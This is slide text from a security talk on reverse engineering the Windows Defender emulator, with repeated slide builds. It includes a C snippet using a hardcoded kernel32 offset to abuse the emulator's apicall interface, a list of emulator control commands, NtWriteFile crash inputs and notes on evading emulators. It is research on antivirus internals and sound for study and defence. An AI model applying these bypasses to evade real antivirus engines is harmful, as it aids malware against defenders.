typedef VOID(*PNTCC)(DWORD, PVOID);

HMODULE k32base = LoadLibraryA("kernel32.dll");

PNTCC apicallNTCC = (PNTCC)((PBYTE)k32base + 0x52004);

apicallNTCC(0x11, "virut_body_found");

}

NtControlChannel(0x11,"virut_body_found") triggers immediate malware detection

Kernel32 base offset:
0x52004

Comes from kernel32 VDLL, so passes is_vdll_page checks

Demo
apicall abuse

apicall Bypass Implications
Fingerprint and manipulate the analysis environment and malware detection heuristics (NtControlChannel, MpReportEvent)
Access to an attack surface with a known history of memory corruption vulnerabilities
Seems very difficult to mitigate against abuse

1

set attribute set_static_unpacking

2

delete attribute store

pea_disable_static_unpacking

3

get mpengine.dll version number

4

set attribute set_pea_enable_vmm_grow

5

set attribute set_pea_deep_analysis

6

set attribute set_pea_hstr_exhaustive

7

set attribute set_pea_aggressiveimport

8

set attribute set_pea_skip_unimplemented_opc

9

set attribute pea_skip_unimplemented_opc

10

set attribute set_pea_disable_apicall_limit

11

get arbitrary attribute

12 check if malware is packed with a given packer

13

set attribute pea_disable_seh_limit

14

get arbitrary attribute substring

15

set pe_vars_t->max_respawns value

16 17 18 19 20 21 22 23+24 25 26-31 32

modify register state (?) set arbitrary attribute load microcode set breakpoint retrieve get_icnt_inside_loop value some sort of domain name signature check set pe_vars_t->internalapis switch_to_net32_proc (.NET) get arbitrary pe attribute by number unimplemented scan_msil_by_base

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research
a. Understanding P0's Vulnerabilities b. Bypassing Mitigations With apicall Abuse c. Fuzzing
5. Conclusion

Fuzzing Emulated APIs
 Create a binary that goes inside the emulator and repeatedly calls hooked WinExec function to request new data, then sends that data to functions with native emulations
 Buffers in memory passed to external hook function to populate with parameters
 Could do fuzzing in-emulator too, but this is easier for logging results

Linux mpclient Binary

MpEngine.dll

Input Generation

Input Generation
 Borrow OSX syscall fuzzer code from MWR Labs OSXFuzz project*
 Nothing fancy, just throw random values at native emulation handlers
 Re-seed rand() at the start of each emulation session, just save off seeds in a log
*github.com/mwrlabs/OSXFuzz

NtWriteFile Overflow
NtWriteFile is normally accessible and exported by ntdll.dll
 VFS_Write has to be triggered with special apicall Tavis' inputs get sanitized out by NtWriteFileWorker before it calls down to VFS_Write

LARGE_INTEGER L; L.QuadPart = 0x2ff9ad29fffffc25;
NtWriteFile( hFile, NULL, NULL, NULL, &ioStatus, buf, 0x1, &L, NULL);
L.QuadPart = 0x29548af5d7b3b7c; NtWriteFile(
hFile, NULL, NULL, NULL, &ioStatus, buf, 0x1, &L, NULL);

NtWriteFile Overflow
NtWriteFile is normally accessible and exported by ntdll.dll
 VFS_Write has to be triggered with special apicall Tavis' inputs get sanitized out by NtWriteFileWorker before it calls down to VFS_Write
I fuzzed NtWriteFile:  ~7 minutes @ ~8,000 NtWriteFile calls / second  Fuzzed Length arguments  Reproduced Tavis' crash, alternate easier to reach
code path through NtWriteFile Unfortunately, patches for VFS_Write bug also fixed this

LARGE_INTEGER L; L.QuadPart = 0x2ff9ad29fffffc25;
NtWriteFile( hFile, NULL, NULL, NULL, &ioStatus, buf, 0x1, &L, NULL);
L.QuadPart = 0x29548af5d7b3b7c; NtWriteFile(
hFile, NULL, NULL, NULL, &ioStatus, buf, 0x1, &L, NULL);

Demo
Fuzzing NtWriteFile

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Summary
We covered:
 Tooling and instrumentation  CPU dynamic translation basics
for x86  Windows environment and
emulation for 32-bit x86 binaries  A bit on vulnerability research

Summary
We covered:
 Tooling and instrumentation  CPU dynamic translation basics
for x86  Windows environment and
emulation for 32-bit x86 binaries  A bit on vulnerability research
Not covered:
 CPU dynamic translation internals
 Non-x86 architectures (x64, ARM, VMProtect, etc...)
 Unpacker integration
 16-bit emulation  Threading model  .NET analysis

Also Inside mpengine.dll

Also Inside mpengine.dll
Unpackers

Also Inside mpengine.dll
Unpackers Parsers

Also Inside mpengine.dll
JS Engine - see my REcon Brx talk Unpackers
Parsers

Also Inside mpengine.dll
JS Engine - see my REcon Brx talk
Unpackers

Parsers

Other Scanning Engines

Also Inside mpengine.dll
JS Engine - see my REcon Brx talk

Unpackers

.NET Engine

Parsers

Other Scanning Engines

Also Inside mpengine.dll
JS Engine - see my REcon Brx talk

Unpackers

Tip: the Lua engine is for signatures - attackers can't hit it

.NET Engine

Parsers

Other Scanning Engines

Antivirus Reverse Engineering
 People constantly talk about what AVs can or can't do, and how/where they are vulnerable
 These claims are mostly backed up by Tavis Ormandy's work at Project Zero and a handful of other conference talks, papers, and blogposts
 I hope we'll see more AV research in the future

Code & More Information
github.com/0xAlexei
Code release:  OutputDebugStringA hooking  "Malware" binary to go inside the emulator  Some IDA scripts, including apicall disassembler
Article in PoC||GTFO 0x19:  OutputDebugStringA hooking  Patch diffing and apicall bypass  apicall disassembly with IDA processor extension module

Conclusion

@0xAlexei

1. Exposition of how a modern AV uses emulation to conduct dynamic analysis

Open DMs

on the endpoint

Thank You:

2. Discussion of emulator traits that malware may use to detect, evade, and exploit emulators
3. Demonstration of attacker / reverse engineer analysis process and tooling

 Tavis Ormandy - exposing the engine, mpclient, sharing ideas
 Mark - hooking ideas  Markus Gaasedelen - Lighthouse  Joxean Koret - OG AV hacker  Numerous friends who helped

Published presentation has 50+ more slides 

edit these slides

github.com/0xAlexei

Defender JS Engine slides / video:

bit.ly/2qio857

Backup Slides

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

My Publications
Fingerprinting consumer AV emulators for malware evasion using "black box" side-channel attacks
ubm.io/2LuTgqX

Surveying evasive malware behavior and defenses against it
bit.ly/2sf0whA
Reverse engineering Windows Defender's JS engine
bit.ly/2qio857

Defender 32-Bit Release Schedule

2017  5/23 (P0 bugs fixed)  6/20 (more P0 bugs fixed)  7/19  8/23  9/27  11/1  12/6 (UK NCSC bugs fixed)

2018  1/18  2/28  3/18  4/3 (Halvar's unrar bug fixed)  4/19  5/23  6/25

Patent Search
"The present invention includes a system and method for translating potential malware devices into safe program code. The potential malware is translated from any one of a number of different types of source languages, including, but not limited to, native CPU program code, platform independent .NET byte code, scripting program code, and the like. Then the translated program code is compiled into program code that may be understood and executed by the native CPU..."

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Reversing Process
 Static reversing in IDA
 Bindiff for patch analysis 
 Dynamic analysis and debugging in GDB using Tavis Ormandy's mpclient with extensive customization
 Coverage with a customized Lighthouse Pintool

Dealing With Calling Conventions
When calling mpengine.dll functions from mpclient: Difficulty of interoperability between MSVC and GCC compiled code
 Possible to massage compiler with __attribute__ annotations
Easier solution - just hand-write assembly thunks to marshall arguments into the correct format

Dealing With Calling Conventions

When calling mpengine.dll functions from mpclient: Difficulty of interoperability between MSVC and GCC compiled code
 Possible to massage compiler with __attribute__ annotations
Easier solution - just hand-write assembly thunks to marshall arguments into the correct format

BYTE * __fastcall __mmap_ex

(

pe_vars_t * v,

// ecx

unsigned int64 addr, // too big for edx

unsigned long size, // edx

unsigned long rights

);

Dealing With Calling Conventions

When calling mpengine.dll functions from mpclient: Difficulty of interoperability between MSVC and GCC compiled code
 Possible to massage compiler with __attribute__ annotations
Easier solution - just hand-write assembly thunks to marshall arguments into the correct format

BYTE * __fastcall __mmap_ex

(

pe_vars_t * v,

// ecx

unsigned int64 addr, // too big for edx

unsigned long size, // edx

unsigned long rights

);

apicall
Custom "apicall" opcode used to trigger native emulation routines
0F FF F0 [4 byte immediate]

apicall
Custom "apicall" opcode used to trigger native emulation routines
0F FF F0 [4 byte immediate]
immediate = crc32(DLL name, all caps) ^ crc32(function name)

apicall

Custom "apicall" opcode used to trigger native emulation routines

$ ./mphashgen KERNEL32.DLL OutputDebugStringA KERNEL32.DLL!OutputDebugStringA: 0xB28014BB

0F FF F0 [4 byte immediate]

immediate = crc32(DLL name, all caps) ^ crc32(function name) 0xB28014BB = crc32("KERNEL32.DLL") ^ crc32("OutputDebugStringA")

apicall

Custom "apicall" opcode used to trigger native emulation routines

$ ./mphashgen KERNEL32.DLL OutputDebugStringA KERNEL32.DLL!OutputDebugStringA: 0xB28014BB

0F FF F0 [4 byte immediate]

immediate = crc32(DLL name, all caps) ^ crc32(function name) 0xB28014BB = crc32("KERNEL32.DLL") ^ crc32("OutputDebugStringA")

0F FF F0 BB 14 80 B2 apicall kernel32!OutPutDebugStringA

apicall Dispatch
{x32, x64, ARM}_parseint checks apicall immediate value, may do special handling with g_MpIntHandlerParam or pass on to native emulation

apicall Dispatch
{x32, x64, ARM}_parseint checks apicall immediate value, may do special handling with g_MpIntHandlerParam or pass on to native emulation
Given a CRC, __call_api_by_crc dispatches to the corresponding emulation routine
Function pointers to emulation routines and associated CRCs are stored in g_syscalls table

VDLL RE - apicall Disassembly
Problem: apicall instruction confuses IDA's disassembler

VDLL RE - apicall Disassembly
Problem: apicall instruction confuses IDA's disassembler
Solution: implement a processor extension module to support apicall disassembly

VDLL RE - apicall Disassembly

apicall stub functions are labeled by script

Some functions have exported names

Article in PoC||GTFO

0x19 explains how this all

works

HexRays Decompiler shows apicall as an

inline assembly block

IDA Processor Extension Module
An IDA Processor Extension Module was used to add support for the apicall instruction
Kicks in whenever a file named "*.mp.dll" is loaded
Rolf Rolles' examples were extremely helpful:
msreverseengineering.com/blog/2015/6/29/transparent-deobfuscation-with-ida-processor-module-extensions msreverseengineering.com/blog/2018/1/23/a-walk-through-tutorial-with-code-on-statically-unpacking-the-finspy-vm-partone-x86-deobfuscation

Instruction Analysis
 Invoked to analyze instructions
 If three bytes at the next instruction address are 0f ff f0 we have an apicall
 Note that the instruction was an apicall and that it was 7 bytes long, so the next instruction starts at $+7

Instruction Representation
Represent the instruction with mnemonic "apicall"
Represent the operand with the name of the function being apicall-ed to

Labeling apicall Stubs
Scan for apicall stub function signatures after autoanalysis

Creating and naming functions with apicall instructions during autoanalysis is very slow

Labeling apicall Stubs
Scan for apicall stub function signatures after autoanalysis

Creating and naming functions with apicall instructions during autoanalysis is very slow

mov edi, edi call $+5 add esp, 0x4 apicall ...

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

Emulator Components

 CPU emulation
 + Timing
 OS API emulation
 + Timing

nt!PEB
Settings
In-Emulator OS Facilities

 Emulated environment
 Settings, processes, file system, registry, network, etc
 Antivirus instrumentation and callbacks

CPU Emulation

Malware Binary AV Instrumentation

Other Scanning Engines

OS (Kernel) Emulation

Persistent System State

mpengine.dll

Process Interaction
Since other processes don't really exist, they can't be interacted with like real processes
ReadProcessMemory & WriteProcessMemory operations for processes other than the one under analysis fail
0x1234 is a handle to the emulated process under analysis

VirtualReg - Virtual Registry
 Unlike VFS, registry is not exposed for direct interaction from with in the emulator, it can only be reached via advapi32.dll emulations
 advapi32.dll's only natively emulated functions are those that deal with registry interaction

WinExec Hook
Good function to hook - emulator functions fine without it actually doing its normal operations
2 parameters - pointer and uint32 - can create an IOCTL-like interface, pointer to arbitrary data, uint32 to specify action

UINT WINAPI WinExec( _In_ LPCSTR lpCmdLine, _In_ UINT uCmdShow
);

Example: Extracting VFS
File system is not stored in mpengine.dll - evidently loaded at runtime from VDMs - can't be trivially extracted with static RE

Example: Extracting VFS
File system is not stored in mpengine.dll - evidently loaded at runtime from VDMs - can't be trivially extracted with static RE

Example: Extracting VFS
File system is not stored in mpengine.dll - evidently loaded at runtime from VDMs - can't be trivially extracted with static RE
WinExec hook Outside of emulator

apicall

ExitProcess Hook
Called at the end of emulation, even if our binary doesn't call it directly
Informs Pin when to stop tracing if under analysis
Original KERNEL32_DLL_ExitProcess function needs to be called for emulator to function properly, so just call through to it

Unique VDLL PDB Paths
c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\autoconv\objfre\i386\autoconv.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\bootcfg\objfre\i386\bootcfg.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\cmd\objfre\i386\cmd.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\dfrgfat\objfre\i386\dfrgfat.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\mmc\objfre\i386\mmc.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\msiexec\objfre\i386\msiexec.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\notepad\objfre\i386\notepad.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\rasphone\objfre\i386\rasphone.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\relog\objfre\i386\relog.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\replace\objfre\i386\replace.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\taskmgr\objfre\i386\taskmgr.pdb c:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\winver\objfre\i386\winver.pdb d:\build.obj.x86chk\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\lodctr\objchk\i386\lodctr.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\attrib\objfre\i386\attrib.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\chkdsk\objfre\i386\chkdsk.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\compact\objfre\i386\compact.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\find\objfre\i386\find.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\finger\objfre\i386\finger.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\fixmapi\objfre\i386\fixmapi.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\ipv6\objfre\i386\ipv6.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\logoff\objfre\i386\logoff.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\migpwd\objfre\i386\migpwd.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\mshta\objfre\i386\mshta.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\ncpa\objfre\i386\ncpa.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\ping\objfre\i386\ping.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\w32tm\objfre\i386\w32tm.pdb d:\build.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\wscript\objfre\i386\wscript.pdb d:\MPEngine\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\Microsoft.VisualBasic\Microsoft.VisualBasic.pdb d:\MPEngine\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Data\System.Data.pdb d:\mpengine\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System\System.pdb d:\mpengine\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Windows.Forms\System.Windows.Forms.pdb d:\pavbld\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Drawing\System.Drawing.pdb d:\pavbld\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Runtime\System.Runtime.pdb d:\pavbld\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\Windows\Windows.pdb d:\pavbld\amcore\Signature\Source\sigutils\vdlls\Microsoft.NET\VFramework\mscorlib\mscorlib.pdb e:\mpengine\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Xml\System.Xml.pdb e:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\rundll32\objfre\i386\rundll32.pdb f:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\explorer\objfre\i386\explorer.pdb f:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\lsass\objfre\i386\lsass.pdb f:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\winlogon\objfre\i386\winlogon.pdb f:\mpengine.obj.x86fre\amcore\mpengine\mavutils\source\sigutils\vfilesystem\files\write\objfre\i386\write.pdb d:\pavbld\amcore\MpEngine\mavutils\Source\sigutils\vdlls\Microsoft.NET\VFramework\System.Runtime.InteropServices.WindowsRuntime\System.Runtime.InteropServices.WindowsRuntime.pdb

Fake Config Files
C:\\WINDOWS\system.ini
; for 16-bit app support [386Enh] woafont=dosapp.fon EGA80WOA.FON=EGA80WOA.FON EGA40WOA.FON=EGA40WOA.FON CGA80WOA.FON=CGA80WOA.FON CGA40WOA.FON=CGA40WOA.FON
[drivers] wave=mmdrv.dll timer=timer.drv
[mci]

C:\\WINDOWS\win.ini

; for 16-bit app support [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1 CMCDLLNAME32=mapi32.dll CMC=1 MAPIX=1 MAPIXVER=1.0.0.1 OLEMessaging=1 [MCI Extensions.BAK] aif=MPEGVideo aifc=MPEGVideo aiff=MPEGVideo asf=MPEGVideo asx=MPEGVideo au=MPEGVideo

m1v=MPEGVideo m3u=MPEGVideo mp2=MPEGVideo mp2v=MPEGVideo mp3=MPEGVideo mpa=MPEGVideo mpe=MPEGVideo mpeg=MPEGVideo mpg=MPEGVideo mpv2=MPEGVideo snd=MPEGVideo wax=MPEGVideo wm=MPEGVideo wma=MPEGVideo wmv=MPEGVideo wmx=MPEGVideo wpl=MPEGVideo wvx=MPEGVideo

Wininet.dll vdll
Minimal internet connectivity emulation with wininet.dll
File on local file system is used to simulate interaction with handles to internet resources

Timing
CPU tick count needs to be updated during instruction execution and OS emulation

Like every other AV emulator I've looked at, Defender aborts execution on rdtscp

Outline
1. Introduction 2. Tooling & Process 3. Reverse Engineering 4. Vulnerability Research 5. Conclusion

libdislocator
libdislocator is a allocator included with AFL that does allocation in a way likely to increase the discovery rate for heap-related bugs
Since it's open source and implemented as in a simple single C file, we can easily drop in libdislocator code to instrument Windows heap API implementations in loadlibrary
Source: github.com/mirrorer/afl/tree/ master/libdislocator  I integrated libdislocator code (not published) into:
loadlibrary/peloader/winapi/Heap.c

Offline Demos
Screenshots of demos for online slide release - see presentation videos when released for live demos

Demo
Scanning with mpclient

Scanning with mpclient

Scanning with mpclient

Demo
Lighthouse Usage

Tracing Timeline

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage

Engine Startup __rsignal(..., RSIG_BOOTENGINE, ...)

Tracing Timeline

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage

Engine Startup

Initial Scan

__rsignal(..., RSIG_BOOTENGINE, ...)

__rsignal(..., RSIG_SCAN_STREAMBUFFER, ...)

Tracing Timeline

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage

Engine Startup

Initial Scan

Emulator Startup

__rsignal(..., RSIG_BOOTENGINE, ...)

__rsignal(..., RSIG_SCAN_STREAMBUFFER, ...)

Tracing Timeline
Hooking Defender's emulation functions for WinExec and ExitProcess allows us to know when emulation starts and stops* 
*ExitProcess is called at the end of every emulation session automatically - I believe this is because setup_pe_vstack puts it at the bottom of the call stack, even for binaries that do not explicitly return to it

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage
Binary calls hooked WinExec emulation with params for start

Engine Startup

Initial Scan

Emulator Startup

Binary Emulation

__rsignal(..., RSIG_BOOTENGINE, ...)

__rsignal(..., RSIG_SCAN_STREAMBUFFER, ...)

Tracing Timeline
Hooking Defender's emulation functions for WinExec and ExitProcess allows us to know when emulation starts and stops* 
*ExitProcess is called at the end of every emulation session automatically - I believe this is because setup_pe_vstack puts it at the bottom of the call stack, even for binaries that do not explicitly return to it

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage

Binary calls hooked WinExec emulation with params for start

Emulator calls ExitProcess

Engine Startup

Initial Scan

Emulator Startup

Binary Emulation

Emulator Teardown

__rsignal(..., RSIG_BOOTENGINE, ...)

__rsignal(..., RSIG_SCAN_STREAMBUFFER, ...)

Tracing Timeline
Hooking Defender's emulation functions for WinExec and ExitProcess allows us to know when emulation starts and stops* 
*ExitProcess is called at the end of every emulation session automatically - I believe this is because setup_pe_vstack puts it at the bottom of the call stack, even for binaries that do not explicitly return to it

Pintool must be enlightened about custom loaded mpengine.dll location - take callback stub ideas from Tavis Ormandy's deepcover Pintool
github.com/taviso/loadlibrary/tree/master/coverage

Binary calls hooked WinExec emulation with params for start

Emulator calls ExitProcess

Engine Startup

Initial Scan

Emulator Startup

Binary Emulation

Emulator Teardown

Collect coverage information

__rsignal(..., RSIG_BOOTENGINE, ...)

__rsignal(..., RSIG_SCAN_STREAMBUFFER, ...)

Pintool Tracing

Pintool Tracing

Loading Coverage File

IDA Analysis

Demo
Hooking OutputDebugStringA

Hooking OutputDebugStringA

Hooking OutputDebugStringA

Hooking OutputDebugStringA

Hooking OutputDebugStringA

Hooking OutputDebugStringA

Demo
Dumping The File System

Dumping The File System

Dumping The File System

Dumping The File System

Dumping The File System

Dumping The File System

Dumping The File System

Demo
Disassembling apicall

Disassembling apicall

Disassembling apicall

Demo
Fuzzing NtWriteFile

Fuzzing NtWriteFile

Fuzzing NtWriteFile

Fuzzing NtWriteFile

Fuzzing NtWriteFile

Fuzzing NtWriteFile

Fuzzing NtWriteFile

Demo
apicall abuse

apicall Abuse - OutputDebugStringA

apicall Abuse - NtControlChannel

apicall Abuse - OutputDebugStringA

